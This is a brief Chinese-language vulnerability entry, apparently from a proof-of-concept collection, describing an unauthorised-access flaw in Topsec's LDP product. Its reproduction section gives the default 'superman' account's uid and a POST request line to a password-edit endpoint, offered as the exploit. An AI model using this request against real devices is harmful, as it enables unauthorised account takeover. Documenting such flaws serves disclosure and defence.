# 天融信LDP未授权访问漏洞

## 漏洞描述

天融信LDP存在未授权访问漏洞

## 漏洞影响

> [!NOTE]
>
> 天融信LDP

## 漏洞复现

POC为

```
默认用户superman的uid=1
POST /?module-auth_user&action=mod_edit.pwd HTTP/1.1
```

